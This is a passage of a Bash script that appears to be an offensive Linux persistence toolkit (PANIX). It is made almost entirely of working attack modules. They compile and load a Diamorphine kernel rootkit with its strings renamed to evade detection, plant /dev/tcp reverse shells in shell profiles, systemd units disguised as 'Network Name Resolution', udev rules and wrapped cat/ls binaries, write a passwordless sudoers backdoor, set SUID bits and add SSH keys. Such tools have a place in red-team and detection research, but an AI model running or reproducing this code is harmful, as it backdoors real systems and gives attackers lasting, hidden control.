                payload="RHOST=$ip; RPORT=$port; TF=\$(mktemp -u); mkfifo \$TF && telnet \$RHOST \$RPORT 0<\$TF | /bin/sh 1>\$TF"
                eval "$payload &"
            else
                echo "[-] Telnet is not available on this system. Cannot use Telnet for reverse shell."
            fi
            ;;
        *)
            echo "Error: Unsupported mechanism: $mechanism"
            echo "Try './panix.sh --reverse-shell --help' for more information."
            exit 1
            ;;
    esac
}

# Module: setup_rootkit.sh
setup_rootkit() {
    # References:
    # Diamorphine Rootkit: https://github.com/m0nad/Diamorphine
    # Inspiration: https://github.com/MatheuZSecurity/D3m0n1z3dShell/blob/main/scripts/implant_rootkit.sh
    # Inspiration: https://github.com/Trevohack/DynastyPersist/blob/main/src/dynasty.sh#L194

    local rk_path="/dev/shm/.rk"
	local tmp_path="/tmp"
    local zip_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.zip"
    local tar_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.tar"
    local clone_url="https://github.com/Aegrah/Diamorphine.git"
    local secret=""
    local identifier=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

    usage_rootkit() {
		echo "Usage: ./panix.sh --rootkit"
		echo "--examples                 Display command examples"
		echo "--secret <secret>          Specify the secret"
		echo "--identifier <identifier>  Specify the identifies"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--secret )
				shift
				secret=$1
				;;
			--identifier )
				shift
				identifier=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --rootkit --secret \"P4N1X\" --identifier \"panix\""
				exit 0
				;;
			--help|-h)
				usage_rootkit
				exit 0
				;;
			* )
				echo "Invalid option for --rootkit: $1"
				echo "Try './panix.sh --rootkit --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $secret || -z $identifier ]]; then
		echo "Error: --secret and --identifier must be specified."
		echo "Try './panix.sh --rootkit --help' for more information."
		exit 1
	fi

	if ! command -v make &> /dev/null; then
		echo "Error: 'make' is not installed. Please install 'make' or 'build-essential' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install build-essential"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install make"
		exit 1
	fi

	if ! command -v gcc &> /dev/null; then
		echo "Error: 'gcc' is not installed. Please install 'gcc' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install gcc"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install gcc"
		exit 1
	fi

	KERNEL_HEADERS="/lib/modules/$(uname -r)/build"
	RESOLVED_HEADERS=$(readlink -f "$KERNEL_HEADERS")

	if [ ! -d "$RESOLVED_HEADERS" ]; then
		echo "Kernel headers not found. Please install the kernel headers for your system."
		echo "For Debian/Ubuntu: sudo apt install linux-headers-\$(uname -r)"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install kernel-devel"
		exit 1
	fi

    mkdir -p $rk_path

    # Check if wget or curl is installed
    if command -v wget >/dev/null 2>&1; then
        downloader="wget"
    elif command -v curl >/dev/null 2>&1; then
        downloader="curl"
    else
        echo "Error: Neither 'wget' nor 'curl' is installed. Please install one of them to proceed."
        exit 1
    fi

    # Function to download files using the available downloader
    download_file() {
        local url="$1"
        local output="$2"
        if [ "$downloader" = "wget" ]; then
            wget -O "$output" "$url"
        else
            curl -L -o "$output" "$url"
        fi
    }

    # Check for zip/unzip
    if command -v zip >/dev/null 2>&1 && command -v unzip >/dev/null 2>&1; then
        echo "zip/unzip is available. Downloading diamorphine.zip..."
        download_file "${zip_url}" "${tmp_path}/diamorphine.zip"
        unzip "${tmp_path}/diamorphine.zip" -d "${tmp_path}/diamorphine"
		mv ${tmp_path}/diamorphine/Diamorphine-master/* "${rk_path}/"

    # Check for tar
    elif command -v tar >/dev/null 2>&1; then
        echo "tar is available. Downloading diamorphine.tar..."
        download_file "${tar_url}" "${tmp_path}/diamorphine.tar"
        tar -xf "${tmp_path}/diamorphine.tar" -C "${rk_path}/" --strip-components=1

    # Check for git
    elif command -v git >/dev/null 2>&1; then
        echo "git is available. Cloning diamorphine.git..."
        git clone "${clone_url}" "${tmp_path}/diamorphine"
		mv ${tmp_path}/diamorphine/* "${rk_path}/"
    # If none are available
    else
        echo "Error: None of unzip, tar, or git is installed. Please install one of them to proceed, or download Diamorphine manually."
        exit 1
    fi

	# Obfuscate most obvious strings
	# Files
	mv ${rk_path}/diamorphine.c ${rk_path}/${identifier}.c
	mv ${rk_path}/diamorphine.h ${rk_path}/${identifier}.h
	
	# Module Information
	sed -i s/m0nad/${identifier}/g ${rk_path}/${identifier}.c
	sed -i -E "s/(MODULE_DESCRIPTION\\(\")[^\"]*(\"\\);)/\1${identifier}\2/" "${rk_path}/${identifier}.c"

	# Strings
	sed -i s/diamorphine_secret/${secret}/g ${rk_path}/${identifier}.h
	sed -i s/diamorphine/${identifier}/g ${rk_path}/${identifier}.h
	sed -i s/diamorphine.h/${identifier}.h/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine_init/${identifier}_init/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine_cleanup/${identifier}_cleanup/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine.o/${identifier}.o/g ${rk_path}/Makefile
	
	# Original functions
	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
	sed -i s/orig_getdents64/${identifier}_orig_getdents64/g ${rk_path}/${identifier}.c
	sed -i s/orig_kill/${identifier}_orig_kill/g ${rk_path}/${identifier}.c
	
	# Hooks
	sed -i s/module_hide/${identifier}_module_hide/g ${rk_path}/${identifier}.c
	sed -i s/module_hidden/${identifier}_module_hidden/g ${rk_path}/${identifier}.c
	sed -i s/is_invisible/${identifier}_invisible/g ${rk_path}/${identifier}.c
	sed -i s/hacked_getdents/${identifier}_getdents/g ${rk_path}/${identifier}.c
	sed -i s/hacked_getdents64/${identifier}_getdents64/g ${rk_path}/${identifier}.c
	sed -i s/hacked_kill/${identifier}_kill/g ${rk_path}/${identifier}.c
	sed -i s/give_root/${identifier}_give_root/g ${rk_path}/${identifier}.c
	sed -i s/is_invisible/${identifier}_is_invisible/g ${rk_path}/${identifier}.c

	# Compile, load and clean
	make -C ${rk_path}

	if [ $? -ne 0 ]; then
		echo "Error: Failed to compile the rootkit."
		exit 1
	fi

	if ! command -v insmod &> /dev/null; then
		/sbin/insmod ${rk_path}/${identifier}.ko
	else
		insmod ${rk_path}/${identifier}.ko
	fi

	if [ $? -ne 0 ]; then
		echo "Error: Failed to load the rootkit."
		exit 1
	fi

	make -C ${rk_path} clean

	echo "[+] Diamorphine rootkit has been installed."
}

# Module: setup_shell_profile.sh
setup_shell_profile() {
	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	usage_shell_profile() {
		echo "Usage: ./panix.sh --shell-profile [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default shell profile settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom shell profile settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom profile path"
		echo "  --command <command>          Specify custom persistence command (no validation)"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --shell-profile --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --shell-profile --custom --command \"(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)\" --path \"/root/.bash_profile\""
				exit 0
				;;
			--help|-h)
				usage_shell_profile
				exit 0
				;;
			* )
				echo "Invalid option for --shell-profile: $1"
				echo "Try './panix.sh --shell-profile --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --shell-profile --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --shell-profile --help' for more information."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/profile"
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.bash_profile"
		fi

		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" >> $profile_path
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './panix.sh --shell-profile --help' for more information."
			exit 1
		fi

		echo "$command" >> $profile_path
	else
		echo "Error: Either --default or --custom must be specified for --profile."
		echo "Try './panix.sh --shell-profile --help' for more information."
		exit 1
	fi

	echo "[+] Shell profile persistence established!"
}

# Module: setup_ssh_key.sh
setup_ssh_key() {
	local default=0
	local custom=0
	local target_user=""
	local ssh_dir=""
	local ssh_key_path=""

	usage_ssh_key() {
		if check_root; then
			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default SSH key settings"
			echo "--custom                     Use custom SSH key settings"
			echo "  --user <user>               Specify user for custom SSH key"
		else
			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default SSH key settings"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--user )
				shift
				target_user=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --ssh-key --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --ssh-key --custom --user victim"
				exit 0
				;;
			--help|-h)
				usage_ssh_key
				exit 0
				;;
			* )
				echo "Invalid option for --ssh-key: $1"
				echo "Try './panix.sh --ssh-key --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v ssh-keygen &> /dev/null; then
		echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --ssh-key --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if check_root; then
			ssh_dir="/root/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		else
			local current_user=$(whoami)
			ssh_dir="/home/$current_user/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		fi

		mkdir -p $ssh_dir
		ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
		cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
		echo "SSH key generated:"
		echo "Private key: $ssh_key_path"
		echo "Public key: ${ssh_key_path}.pub"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $target_user ]]; then
			echo "Error: --user must be specified when using --custom."
			echo "Try './panix.sh --ssh-key --help' for more information."
			exit 1
		fi

		if id -u $target_user &>/dev/null; then
			local user_home=$(eval echo ~$target_user)
			ssh_dir="$user_home/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"

			mkdir -p $ssh_dir
			chown $target_user:$target_user $ssh_dir
			sudo -u $target_user ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
			cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
			chown $target_user:$target_user $ssh_key_path $ssh_key_path.pub $ssh_dir/authorized_keys
			echo "SSH key generated for $target_user:"
			echo "Private key: $ssh_key_path"
			echo "Public key: ${ssh_key_path}.pub"
		else
			echo "Error: User $target_user does not exist."
			exit 1
		fi
	else
		echo "Error: Either --default or --custom must be specified for --ssh-key."
		echo "Try './panix.sh --ssh-key --help' for more information."
		exit 1
	fi

	echo "[+] SSH key persistence established!"
}

# Module: setup_sudoers_backdoor.sh
setup_sudoers_backdoor() {
	local username=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_sudoers_backdoor() {
		echo "Usage: ./panix.sh --sudoers-backdoor [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --sudoers --username <username>"
				exit 0
				;;
			--help|-h)
				usage_sudoers_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --sudoers-backdoor: $1"
				echo "Try './panix.sh --sudoers-backdoor --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		echo "Try './panix.sh --sudoers-backdoor --help' for more information."
		exit 1
	fi

	echo "$username ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username can now run all commands without a sudo password."
	else
		echo "[-] Failed to create sudoers backdoor for user $username."
		exit 1
	fi
	echo "[+] Sudoers backdoor persistence established!"
}

# Module: setup_suid_backdoor.sh
setup_suid_backdoor() {
	local default=0
	local custom=0
	local binary=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_suid_backdoor() {
		echo "Usage: ./panix.sh --suid [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default SUID settings"
		echo "--custom                     Use custom SUID settings"
		echo "  --binary <binary>            Specify the binary to give SUID permissions"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --suid --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --suid --custom --binary \"/bin/find\""
				exit 0
				;;
			--help|-h)
				usage_suid_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --suid: $1"
				echo "Try './panix.sh --suid --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --suid --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --suid --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("find" "dash" "python" "python3")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				# Resolve symbolic links to get the real path
				path=$(realpath $path)
				chmod u+s $path
				if [[ $? -eq 0 ]]; then
					echo "[+] SUID privilege granted to $path"
				else
					echo "[-] Failed to grant SUID privilege to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified with --custom."
			echo "Try './panix.sh --suid --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			# Resolve symbolic links to get the real path
			path=$(realpath $path)
			chmod u+s $path
			if [[ $? -eq 0 ]]; then
				echo "[+] SUID privilege granted to $path"
			else
				echo "[-] Failed to grant SUID privilege to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
	echo "[+] SUID backdoor persistence established!"
}

# Module: setup_system_binary_backdoor.sh
setup_system_binary_backdoor() {
	local default=0
	local custom=0
	local warning=0
	local ip=""
	local port=""
	local binary=""
	local command=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_system_binary_backdoor() {
		echo "Usage: ./panix.sh --system-binary [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default system binary backdoor settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom system binary backdoor settings"
		echo "  --binary <binary>            Specify the binary to backdoor"
		echo "  --command <command>          Specify the custom command to execute"
		echo "  --warning                    This may interrupt your system.. Be careful!"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--warning )
				warning=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --system-binary --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --system-binary --custom --binary \"/bin/cat\" --command \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337'\" --warning"
				exit 0
				;;
			--help|-h)
				usage_system_binary_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --system-binary-backdoor: $1"
				echo "Try './panix.sh --system-binary --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --system-binary --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --system-binary --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --system-binary --help' for more information."
			exit 1
		fi

		local binaries=("cat" "ls")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				mv $path $path.original
				echo -e '#!/bin/bash\n/bin/bash -c "bash -i >& /dev/tcp/'$ip'/'$port' 0>&1 2>/dev/null &"\n'$path'.original "$@"' > $path
				chmod +x $path
				echo "[+] $bin backdoored successfully."
			else
				echo "[-] $bin is not present on the system."
			fi
		done

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary || -z $command ]]; then
			echo "Error: --binary and --command must be specified when using --custom."
			echo "Try './panix.sh --system-binary --help' for more information."
			exit 1
		fi

		if [[ $warning -eq 0 ]]; then
			echo "Error: --warning must be specified when using --custom."
			echo "Warning: this will overwrite the original binary with the backdoored version."
			echo "You better know what you are doing with that custom command!"
			echo "Try './panix.sh --system-binary --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			mv $path $path.original
			echo -e '#!/bin/bash\n'$command' 2>/dev/null\n'$path'.original "$@"' > $path
			chmod +x $path
			echo "[+] $binary backdoored successfully."
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
}

# Module: setup_systemd.sh
setup_systemd() {
	local service_path=""
	local timer_path=""
	local timer=0
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	usage_systemd() {
		echo "Usage: ./panix.sh --systemd [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default systemd settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom systemd settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom service path (must end with .service)"
		echo "  --command <command>          Specify custom persistence command (no validation)"
		echo "  --timer                      Create systemd timer (1 minute interval)"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				service_path=$1
				if [[ ! $service_path == *.service ]]; then
					echo "Error: --path must end with .service"
					exit 1
				fi
				;;
			--command )
				shift
				command=$1
				;;
			--timer )
				timer=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --systemd --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --systemd --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\" --path \"/usr/local/lib/systemd/system/evil.service\" --timer"
				exit 0
				;;
			--help|-h)
				usage_systemd
				exit 0
				;;
			* )
				echo "Invalid option for --systemd: $1"
				echo "Try './panix.sh --systemd --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --systemd --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --systemd --help' for more information."
			exit 1
		fi

		if check_root; then
			service_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service"
			timer_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer"
		else
			local current_user=$(whoami)
			service_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service"
			timer_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer"
		fi

		mkdir -p $(dirname "$service_path")
		cat <<-EOF > $service_path
		[Unit]
		Description=Network Name Resolution

		[Service]
		ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

		if check_root; then
		if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

		else
			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service ]; then
				echo "Service file created successfully!"
			else
				echo "Failed to create service file!"
				exit 1
			fi
		fi

		cat <<-EOF > $timer_path
		[Unit]
		Description=Network Name Resolution Timer

		[Timer]
		OnCalendar=*:*:00
		Persistent=true

		[Install]
		WantedBy=timers.target
		EOF

				if check_root; then
			if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi

		else
			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi
		fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $timer_path)
			systemctl start $(basename $timer_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $timer_path)
			systemctl --user start $(basename $timer_path)
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $service_path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './panix.sh --systemd --help' for more information."
			exit 1
		fi

		mkdir -p $(dirname "$service_path")
		cat <<-EOF > $service_path
		[Unit]
		Description=Custom Service

		[Service]
		ExecStart=$command
		Restart=always
		RestartSec=60

		[Install]
		WantedBy=default.target
		EOF

		if [ -f $service_path ]; then
			echo "Service file created successfully!"
		else
			echo "Failed to create service file!"
			exit 1
		fi

		if check_root; then
			systemctl daemon-reload
			systemctl enable $(basename $service_path)
			systemctl start $(basename $service_path)
		else
			systemctl --user daemon-reload
			systemctl --user enable $(basename $service_path)
			systemctl --user start $(basename $service_path)
		fi

		if [[ $timer -eq 1 ]]; then
			timer_path="${service_path%.service}.timer"
			mkdir -p $(dirname "$timer_path")
			cat <<-EOF > $timer_path
			[Unit]
			Description=Custom Timer

			[Timer]
			OnCalendar=*:*:00
			Persistent=true

			[Install]
			WantedBy=timers.target
			EOF

			if [ -f $timer_path ]; then
				echo "Timer file created successfully!"
			else
				echo "Failed to create timer file!"
				exit 1
			fi

			if check_root; then
				systemctl daemon-reload
				systemctl enable $(basename $timer_path)
				systemctl start $(basename $timer_path)
			else
				systemctl --user daemon-reload
				systemctl --user enable $(basename $timer_path)
				systemctl --user start $(basename $timer_path)
			fi
		fi
	else
		echo "Error: Either --default or --custom must be specified for --systemd."
		echo "Try './panix.sh --systemd --help' for more information."
		exit 1
	fi

	echo "[+] Systemd service persistence established!"
}

# Module: setup_udev.sh
setup_udev() {
	local default=0
	local ip=""
	local port=""
	local mechanism=""
	local custom=0
	local command=""
	local path=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_udev() {
		echo "Usage: ./panix.sh --udev [OPTIONS]"
		echo "--examples                              Display command examples"
		echo "--default                               Use default udev settings"
		echo "  --ip <ip>                               Specify IP address"
		echo "  --port <port>                           Specify port number"
		echo "  --sedexp | --at | --cron | --systemd    Specify the mechanism to use"
		echo "--custom                                Use custom udev settings"
		echo "  --command <command>                     Specify custom command"
		echo "  --path <path>                           Specify custom path"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--sedexp | --at | --cron | --systemd )
				mechanism="$1"
				;;
			--custom )
				custom=1
				;;
			--command )
				shift
				command="$1"
				;;
			--path )
				shift
				path="$1"
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --udev --default --ip 10.10.10.10 --port 1337 --sedexp|--at|--cron|--systemd"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --udev --custom --command 'SUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /tmp/payload now\"' --path \"/etc/udev/rules.d/10-backdoor.rules\""
				echo "echo -e '#!/bin/sh\nnohup setsid bash -c \"bash -i >& /dev/tcp/10.10.10.10/1337 0>&1\" &' > /tmp/payload && chmod +x /tmp/payload && udevadm control --reload"
				exit 0
				;;
			--help|-h)
				usage_udev
				exit 0
				;;
			* )
				echo "Invalid option: $1"
				echo "Try './panix.sh --udev --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --default requires --ip, --port and one of --sedexp, --at, --cron, or --systemd."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi
		if [[ -z $mechanism ]]; then
			echo "Error: --default requires one of --sedexp, --at, --cron, or --systemd."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi

		case $mechanism in
			--sedexp )
				# Reference: https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp

				# Create a helper program to bypass network restrictions
				cat <<-EOF > /usr/bin/sedexp
				#!/bin/bash
				while true; do
					if [ -f /tmp/sedexp ]; then
						rm /tmp/sedexp
						nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
					fi
					sleep 5
				done;
				EOF

				# Grant the program execution privileges and run it in the background
				# This process will die on reboot. Use Systemd/cron/at for persistent execution
				chmod +x /bin/sedexp
				nohup /bin/sedexp &

				# Create a more widely supported sedexp udev rules file based on Sedexp malware
				cat <<-EOF > /etc/udev/rules.d/10-sedexp.rules
				ACTION=="add", KERNEL=="random", RUN+="/usr/bin/touch /tmp/sedexp"
				EOF
				;;

			--at )
				# Check if 'at' utility is available
				if ! command -v at &> /dev/null; then
					echo "Error: 'at' utility is not available. Please install it to use --at option."
					exit 1
				fi

				# Create the netest script with reverse shell payload
				cat <<-EOF > /usr/bin/atest
				#!/bin/sh
				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
				EOF
				chmod +x /usr/bin/atest

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/11-atest.rules
				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/usr/bin/at -M -f /usr/bin/atest now"
				EOF
				;;

			--cron )
				# Create the netest script with reverse shell payload
				cat <<-EOF > /usr/bin/crontest
				#!/bin/sh
				nohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &
				EOF
				chmod +x /usr/bin/crontest

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/11-crontest.rules
				SUBSYSTEM=="net", KERNEL!="lo", RUN+="/bin/bash -c 'echo \"* * * * * /usr/bin/crontest\" | crontab -'"
				EOF
				;;

			--systemd )
				# Create the systemd service unit
				cat <<-EOF > /etc/systemd/system/systemdtest.service

				[Unit]
				Description=Systemdtest Service

				[Service]
				ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
				Restart=always
				RestartSec=60

				[Install]
				WantedBy=default.target
				EOF

				systemctl daemon-reload
				systemctl enable systemdtest.service
				systemctl start systemdtest.service

				# Create the udev rules file
				cat <<-EOF > /etc/udev/rules.d/12-systemdtest.rules
				SUBSYSTEM=="net", KERNEL!="lo", TAG+="systemd", ENV{SYSTEMD_WANTS}+="systemdtest.service"
				EOF
				;;
		esac

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command || -z $path ]]; then
			echo "Error: --custom requires --command and --path."
			echo "Try './panix.sh --udev --help' for more information."
			exit 1
		fi

		# Create the custom udev rules file
		echo "$command" > "$path"

	else
		echo "Error: Either --default or --custom must be specified for --udev."
		echo "Try './panix.sh --udev --help' for more information."
		exit 1
	fi

	# Reload udev rules
	sudo udevadm control --reload

	echo "[+] Udev persistence established."
}

# Module: setup_web_shell.sh
setup_web_shell() {
	local port=""
	local rev_port=""
	local language=""
	local mechanism=""
	local ip=""

	usage_web_shell() {
		echo "Usage: ./panix.sh --web-shell [OPTIONS]"
		echo "  --mechanism <cmd|reverse>             Specify mechanism (cmd for command execution, reverse for reverse shell)"
		echo "  --language <php|python>               Specify language for the web server"
		echo "  --port <port>                         Specify port for the web server"
		echo "  --rev-port <port>                     Specify port for the reverse shell"
		echo "  --ip <ip>                             Required for reverse mechanism, specify the attacker's IP"
		echo "  --examples                            Display command examples"
		echo "  --help|-h                             Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--port )
				shift
				port=$1
				;;
			--rev-port )
				shift
				rev_port=$1
				;;
			--language )
				shift
				language=$1
				;;
			--mechanism )
				shift
				mechanism=$1
				;;
			--ip )
